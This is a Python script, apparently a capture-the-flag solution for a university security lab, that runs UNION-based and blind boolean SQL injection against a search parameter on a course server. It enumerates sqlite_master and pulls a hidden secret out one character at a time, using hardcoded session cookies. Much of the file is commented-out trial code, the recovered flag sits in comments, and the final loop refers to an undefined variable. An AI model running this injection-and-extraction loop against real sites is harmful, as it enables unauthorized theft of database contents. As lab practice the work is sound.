from itertools import product
import requests
import random
import itertools

server = 'mustard.stt.rnl.tecnico.ulisboa.pt'
port = 21262
SERVER = f'http://{server}:{port}'

# GET REQUESTS
params = {
    'search': "' UNION SELECT 1, sql, tbl_name FROM sqlite_master WHERE tbl_name = 'sqlite_master' -- "}
headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
           'Content-Type': 'application/json',
           'Cookie': '_ga=GA1.2.899641607.1581548611; _ga=GA1.3.899641607.1581548611; user=5407626867628042813; _gid=GA1.2.1004854033.1643742476; session=.eJwdjrsOwjAMAP8lM4OT-NmfqRLHFqyFToh_pyDdjSfdu-x5xPNettdxxq3sj1W2kmaInsx9ikP1Ia13N8qWWFeCNmlhAMzNnGWkTNJRgeNXLcpFizqidkBQSmLX2YRwoqRjDCGV0FzgooGMcwF1s6zos_ZRrpHzGcf_praOl3_QFD5f7okxWQ.YfvLMQ.nWWXN2TFloc0mIrpWkFWlw0vbhM'}

r = requests.get(SERVER, params=params, headers=headers)

# ANSWERS
# print('status     : ', r.status_code)
# print('headers    : ', r.headers)
# print('cookies    : ', r.cookies)
# print('html       : ', r.text)


# for index in range(100):


# for key_word in key_words:

#     # GET REQUESTS
#     params = {
#         'search': f"' UNION SELECT 1, sql, tbl_name FROM sqlite_master WHERE tbl_name = '{key_word}' -- "}
#     headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
#                'Content-Type': 'application/json',
#                'Cookie': '_ga=GA1.2.899641607.1581548611; _ga=GA1.3.899641607.1581548611; user=5407626867628042813; _gid=GA1.2.1004854033.1643742476; session=.eJwdjrsOwjAMAP8lM4OT-NmfqRLHFqyFToh_pyDdjSfdu-x5xPNettdxxq3sj1W2kmaInsx9ikP1Ia13N8qWWFeCNmlhAMzNnGWkTNJRgeNXLcpFizqidkBQSmLX2YRwoqRjDCGV0FzgooGMcwF1s6zos_ZRrpHzGcf_praOl3_QFD5f7okxWQ.YfvLMQ.nWWXN2TFloc0mIrpWkFWlw0vbhM'}

#     r = requests.get(SERVER, params=params, headers=headers)

#     number_of_results = int(r.text.split("<i>Found ", 1)[1][0])

#     # print("Number of results: ", number_of_results)

#     if(number_of_results != 4):
#         print("Success: ", key_word)

# dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ:!_\{\}"
# dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$&'()*+,-./:;<=>?@[\\]^_`{|}~"
dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ:)(><=?\"^`}{_!#.@][$#&"
# dictionary = "!@#$"
# # key_words = ['user', 'blog_post', 'sqlite_master']
# chars = 'abcdefghijklmnopqrstuvwxyz_'  # chars to look for
# # flag = False

# in_case_i_forget_my_password_is:_ssof_i_m_blind_but_i_can_still_get_your_data_using_boolean_injection}

# in_case_i_forget_my_password_is:_SSof{i_m_blind_but_i_can_still_get_your_data_using_boolean_injection}


# flag = 'SSof{i_m_blind_but_i_can_still_get_your_data_using_boolean_injection}'
# dictionary_special_chars = "!\"#$&'()*+,-./:;<=>?@[\\]^_`{|}~"
# # flag = "in_case_i_forget_my_password_is:_ssof_i_m_blind_but_i_can_still_get_your_data_using_boolean_injection"

# flag = list(flag)
# make_flag = list()
# isupper(flag)


# def make_one_uppercase(flag, last_index):
#     for index, letter in enumerate(flag):
#         last_index = index
#         if letter not in dictionary_special_chars and last_index == index:
#             make_flag.append(letter.upper())
#         else:
#             make_flag.append(letter)
#     print(''.join(make_flag) + "\n")
#     print("\n")
#     # make_one_uppercase(''.join(make_flag))


# for index, letter in enumerate(flag):
#     print("\n")
#     make_one_uppercase(flag, index)


def get_letter(string):
    for index in range(0, len(dictionary)):  # only do lengths of 1 + 2
        # 'search': f"' UNION SELECT id, secret, 3 FROM super_s_sof_secrets WHERE id = 1 AND length(secret) == 102 -- "}
        letter = dictionary[index]
        # print("%s", letter)
        # GET REQUESTS
        params = {
            'search': f"' UNION SELECT id, secret, 3 FROM super_s_sof_secrets WHERE secret like '{string}{letter}%' COLLATE Latin1_General_CS_AS -- "}
        headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
                   'Content-Type': 'application/json',
                   'Cookie': '_ga=GA1.2.899641607.1581548611; _ga=GA1.3.899641607.1581548611; user=5407626867628042813; _gid=GA1.2.1004854033.1643742476; session=.eJwdjrsOwjAMAP8lM4OT-NmfqRLHFqyFToh_pyDdjSfdu-x5xPNettdxxq3sj1W2kmaInsx9ikP1Ia13N8qWWFeCNmlhAMzNnGWkTNJRgeNXLcpFizqidkBQSmLX2YRwoqRjDCGV0FzgooGMcwF1s6zos_ZRrpHzGcf_praOl3_QFD5f7okxWQ.YfvLMQ.nWWXN2TFloc0mIrpWkFWlw0vbhM'}

        r = requests.get(SERVER, params=params, headers=headers)

        # print(r.text)
        if r.status_code == 200:
            number_of_results = int(r.text.split("<i>Found ", 1)[1][0])

            # print("Number of results: ", number_of_results)

            if(number_of_results != 4):
                # print(r.text)
                # print("Len: ", len(dictionary))
                # print("INDEX: ", index)
                # print("Success: ", letter)
                # break
                return letter


for index in range(0, len(dictionary)):  # only do lengths of 1 + 2
    # 'search': f"' UNION SELECT id, secret, 3 FROM super_s_sof_secrets WHERE id = 1 AND length(secret) == 102 -- "}
    letter = dictionary[index]
    print("%s", letter)
    string = ''

    while len(string) < 102:
        string += get_letter(string)
        print(string)

#     print("Final: ", string)
# GET REQUESTS
# params = {
#     'search': f"' UNION SELECT id, secret, 3 FROM super_s_sof_secrets WHERE id = 1 AND length(secret) == 102 AND secret like 'in_case_i_forget_my_password_is:_ssof_i_m_blind_but_i_can_still_g{letter}%' COLLATE Latin1_General_CS_AS  -- "}
# headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
#            'Content-Type': 'application/json',
#            'Cookie': '_ga=GA1.2.899641607.1581548611; _ga=GA1.3.899641607.1581548611; user=5407626867628042813; _gid=GA1.2.1004854033.1643742476; session=.eJwdjrsOwjAMAP8lM4OT-NmfqRLHFqyFToh_pyDdjSfdu-x5xPNettdxxq3sj1W2kmaInsx9ikP1Ia13N8qWWFeCNmlhAMzNnGWkTNJRgeNXLcpFizqidkBQSmLX2YRwoqRjDCGV0FzgooGMcwF1s6zos_ZRrpHzGcf_praOl3_QFD5f7okxWQ.YfvLMQ.nWWXN2TFloc0mIrpWkFWlw0vbhM'}

# r = requests.get(SERVER, params=params, headers=headers)

# # print(r.text)
# if r.status_code == 200:
#     number_of_results = int(r.text.split("<i>Found ", 1)[1][0])

#     print("Number of results: ", number_of_results)

#     if(number_of_results != 4):
#         print("Len: ", len(dictionary))
#         print("INDEX: ", index)
#         print("Success: ", letter)
#         break


# query_table_name = ""
# for j in range(1, 99999999999):
#     # for i in range(0, len(dictionary)):
#     # print("String: ", )

#     if len(query_table_name) > 20:
#         query_table_name = ""
#     query_table_name = query_table_name + random.choice(dictionary)
#     temp_query_name = query_table_name
#     # query_table_name = temp_query_name
#     print('[*] Trying: ' + temp_query_name)


# query_table_name = ""
# for j in range(1, 50):
#     query_table_name = ""
#     # # print("String: ", )
#     # temp_query_name = query_table_name + dictionary[i]
#     # query_table_name = temp_query_name
#     # print('[*] Trying: ' + temp_query_name)

# # GET REQUESTS
# params = {
#     'search': f"' UNION SELECT 1, sql, tbl_name FROM sqlite_master WHERE tbl_name == 'super_s_sof_secrets' AND length(sql) == 92 AND sql like 'CREATE TABLE super_s_sof_secrets (%' -- "}
# headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
#            'Content-Type': 'application/json',
#            'Cookie': '_ga=GA1.2.899641607.1581548611; _ga=GA1.3.899641607.1581548611; user=5407626867628042813; _gid=GA1.2.1004854033.1643742476; session=.eJwdjrsOwjAMAP8lM4OT-NmfqRLHFqyFToh_pyDdjSfdu-x5xPNettdxxq3sj1W2kmaInsx9ikP1Ia13N8qWWFeCNmlhAMzNnGWkTNJRgeNXLcpFizqidkBQSmLX2YRwoqRjDCGV0FzgooGMcwF1s6zos_ZRrpHzGcf_praOl3_QFD5f7okxWQ.YfvLMQ.nWWXN2TFloc0mIrpWkFWlw0vbhM'}

# r = requests.get(SERVER, params=params, headers=headers)

# print("R: ", r)
# if r.status_code == 200:
#     number_of_results = int(r.text.split("<i>Found ", 1)[1][0])

#     print("Number of results: ", number_of_results)

#     if(number_of_results != 4):
#         print("Success: ")

# secret_text


# dictionary_special_chars = "!\"#$&'()*+,-./:;<=>?@[\\]^_`{|}~"


# flag = 'in_case_i_forget_my_password_is:_ssof_i_m_blind_but_i_can_still_get_your_data_using_boolean_injection_'


# def get_flag_with_spec_chars(string):
#     params = {
#         'search': f"' UNION SELECT id, secret, 3 FROM super_s_sof_secrets WHERE id = 1 AND secret == '{string}' -- "}
#     headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
#                'Content-Type': 'application/json',
#                'Cookie': '_ga=GA1.2.899641607.1581548611; _ga=GA1.3.899641607.1581548611; user=5407626867628042813; _gid=GA1.2.1004854033.1643742476; session=.eJwdjrsOwjAMAP8lM4OT-NmfqRLHFqyFToh_pyDdjSfdu-x5xPNettdxxq3sj1W2kmaInsx9ikP1Ia13N8qWWFeCNmlhAMzNnGWkTNJRgeNXLcpFizqidkBQSmLX2YRwoqRjDCGV0FzgooGMcwF1s6zos_ZRrpHzGcf_praOl3_QFD5f7okxWQ.YfvLMQ.nWWXN2TFloc0mIrpWkFWlw0vbhM'}

#     r = requests.get(SERVER, params=params, headers=headers)

#     print("FLAG: ", string)
#     if r.status_code == 200:
#         number_of_results = int(r.text.split("<i>Found ", 1)[1][0])

#         # print("Number of results: ", number_of_results)

#         if(number_of_results != 4):
#             print("Success: ", string)
#             return
#     return string


# for index, char in enumerate(flag):
#     for special_char in dictionary_special_chars:
#         finish = False
#         if finish == True:
#             break
#         if char in dictionary_special_chars:
# new_flag = list(flag)
# new_flag[index] = special_char
# new_flag = ''.join(new_flag)
# print("FLAG: ", new_flag)
# flag = new_flag
# in_case_i_forget_my_password_is:_SSof{i_m_blind_but_i_can_still_get_your_data_using_boolean_injection}
# flag = "in_case_i_forget_my_password_is:_SSof{i_m_blind_but_i_can_still_get_your_data_using_boolean_injection}"

# flag = 'in_case_i_forget_my_password_is:_ssof{i_m_blind_but_i_can_still_get_your_data_using_boolean_injection}'

# dictionary_special_chars = "_}{:"


# def keep_one_uppercase(flag, uppercaseIndex):
#     make_flag = list()
#     for index, letter in enumerate(flag):
#         # last_index = index
#         if letter not in dictionary_special_chars and index == uppercaseIndex:
#             make_flag.append(letter.upper())
#         else:
#             make_flag.append(letter)
#     print(''.join(make_flag))
#     return ''.join(make_flag)


# def make_one_uppercase(flag, uppercaseIndex):
#     make_flag = list()
#     for index, letter in enumerate(flag):
#         # last_index = index
#         if letter not in dictionary_special_chars and index == uppercaseIndex:
#             make_flag.append(letter.upper())
#         else:
#             make_flag.append(letter)
#     print(''.join(make_flag))
#     return flag


# def binary_permutations(lst):
#     for comb in combinations(range(len(lst)), lst.count(1)):
#         result = [0] * len(lst)
#         for i in comb:
#             result[i] = 1
#         yield result


# for perm in binary_permutations([1, 1, 0, 0]):
#     print(perm)

# flag_binary = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
#                0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

# for perm in binary_permutations(flag_binary):
#     print(perm)

result = map(''.join, itertools.product(*zip(flag.lower(), flag.upper())))
for item in result:
    print(item)
    params = {
        'search': f"' UNION SELECT id, secret, 3 FROM super_s_sof_secrets WHERE secret == '{flag}' -- "}
    headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
               'Content-Type': 'application/json',
               'Cookie': '_ga=GA1.2.899641607.1581548611; _ga=GA1.3.899641607.1581548611; user=5407626867628042813; _gid=GA1.2.1004854033.1643742476; session=.eJwdjrsOwjAMAP8lM4OT-NmfqRLHFqyFToh_pyDdjSfdu-x5xPNettdxxq3sj1W2kmaInsx9ikP1Ia13N8qWWFeCNmlhAMzNnGWkTNJRgeNXLcpFizqidkBQSmLX2YRwoqRjDCGV0FzgooGMcwF1s6zos_ZRrpHzGcf_praOl3_QFD5f7okxWQ.YfvLMQ.nWWXN2TFloc0mIrpWkFWlw0vbhM'}

    r = requests.get(SERVER, params=params, headers=headers)

    # print("R: ", r.text)
    if r.status_code == 200:
        number_of_results = int(r.text.split("<i>Found ", 1)[1][0])

        # print("Number of results: ", number_of_results)

        if(number_of_results != 4):
            print("Success: ")
            # return
            finish = True
            break

# flag_length = len(flag)
# for index in range(0, flag_length):
#     flag = keep_one_uppercase(flag, index)
#     for index in range(0, flag_length):
#         flag = make_one_uppercase(flag, index)
        # params = {
        #     'search': f"' UNION SELECT id, secret, 3 FROM super_s_sof_secrets WHERE secret == '{flag}' -- "}
        # headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
        #            'Content-Type': 'application/json',
        #            'Cookie': '_ga=GA1.2.899641607.1581548611; _ga=GA1.3.899641607.1581548611; user=5407626867628042813; _gid=GA1.2.1004854033.1643742476; session=.eJwdjrsOwjAMAP8lM4OT-NmfqRLHFqyFToh_pyDdjSfdu-x5xPNettdxxq3sj1W2kmaInsx9ikP1Ia13N8qWWFeCNmlhAMzNnGWkTNJRgeNXLcpFizqidkBQSmLX2YRwoqRjDCGV0FzgooGMcwF1s6zos_ZRrpHzGcf_praOl3_QFD5f7okxWQ.YfvLMQ.nWWXN2TFloc0mIrpWkFWlw0vbhM'}

        # r = requests.get(SERVER, params=params, headers=headers)

        # # print("R: ", r.text)
        # if r.status_code == 200:
        #     number_of_results = int(r.text.split("<i>Found ", 1)[1][0])

        #     print("Number of results: ", number_of_results)

        #     if(number_of_results != 4):
        #         print("Success: ")
        #         # return
        #         finish = True
